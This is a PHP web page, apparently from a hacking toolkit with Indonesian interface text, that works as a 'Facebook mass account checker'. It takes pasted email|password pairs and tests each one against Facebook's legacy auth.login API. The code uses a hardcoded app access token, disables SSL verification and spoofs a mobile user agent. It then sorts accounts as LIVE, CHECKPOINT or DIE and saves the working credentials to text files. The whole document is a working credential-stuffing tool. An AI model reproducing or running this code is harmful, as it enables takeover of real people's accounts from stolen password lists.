<?php 
$judul =" Facebook Mass Account Checker | Safe";
include 'head.php';
?>
 <h3> FACEBOOK MASS ACCOUNT CHECKER</h3>
<form name="myForm" id="myForm"  onsubmit="return validateForm('myForm');" method="POST">


<textarea id="countMe" cols="30" rows="5" class="form-control input-lg" id="akun" name="akun">
email|akun
</textarea>

<div class="theCount">Limit Akun: <span id="linesUsed">0</span><div>


</br>


<input class="btn btn-warning" type="submit" value="SCAN" name="submit" />

</form>


<script>
        function validateForm(formId)
        {
            var inputs, index;
            var form=document.getElementById(formId);
            inputs = form.getElementsByTagName('input');
            for (index = 0; index < inputs.length; ++index) {
                // deal with inputs[index] element.
                if (inputs[index].value==null || inputs[index].value=="")
                {
                    alert("TIDAK BOLEH KOSONG AJG!1!");
                    return false;
                }
            }
        }
$(document).ready(function(){

    var lines = 10;
    var linesUsed = $('#linesUsed');

    $('#countMe').keydown(function(e) {

        newLines = $(this).val().split("\n").length;
        linesUsed.text(newLines);

        if(e.keyCode == 13 && newLines >= lines) {
            linesUsed.css('color', 'red');
            return false;
        }
        else {
            linesUsed.css('color', '');
        }
    });
});
</script>

<?php 
@set_time_limit(0);
error_reporting(0);
$akun =  htmlspecialchars($_POST['akun']);
 $ambil = explode(PHP_EOL,$akun);
foreach($ambil as $targets) {
$potong = explode("|", $targets);
            cekAkunFb($potong[0], $potong[1]);
      }  
    
function cekAkunFb($email, $passwd) {
    $data = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $email,
        "password" => $passwd,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($data as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $data['sig'] = $sig;
    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $result = json_decode(curl_exec($ch));
     
echo '<br><b><center>';
    $empas = $email."|".$passwd;
     echo '<hr>';
    if(isset($result->access_token)) {
        echo $empas." <font color='GREEN'>LIVE</font>".PHP_EOL;
file_put_contents("live.txt", $empas.PHP_EOL, FILE_APPEND);
        
    }elseif($result->error_code == 405 || preg_match("/User must verify their account/i", $result->error_msg)) {
         
echo $empas."<font color='red'> CHECKPOINT</font>".PHP_EOL;
file_put_contents("checkpoint.txt", $empas.PHP_EOL, FILE_APPEND);
    } 
else echo $empas." <font color='red'>DIE</font>".PHP_EOL;
}


?>